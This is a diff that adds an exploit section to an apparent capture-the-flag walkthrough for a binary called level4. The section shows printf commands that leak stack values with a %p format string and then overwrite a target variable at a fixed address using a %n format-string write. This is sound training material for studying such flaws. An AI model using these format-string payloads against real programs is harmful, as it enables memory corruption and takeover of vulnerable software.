@@ -126,4 +126,17 @@ No user-defined functions request space on the heap. However, `printf()` calls m
 
 ## Exploit
 
-...
+Using the same strategy as in [level3](../level3/walkthrough.md), we can build a payload to assign the expected value to `m`.
+
+First let's identify where the buffer starts 
+```sh
+# We skip 12 words: (20+4+4+16) / 4 = 12
+$ printf "%b\n" "\257\276\255\336%12\$p" | ./level4
+����0xdeadbeaf
+```
+
+In the same fashion as the previous exercice, we assign the value to the target address by writing the required amount of characters.
+```sh
+# We write a total of 16930116 characters (4 + 16930112) to assign it to target address.
+$ printf "%b\n" "\020\230\004\010%16930112c%12\$n" | ./level4
+```
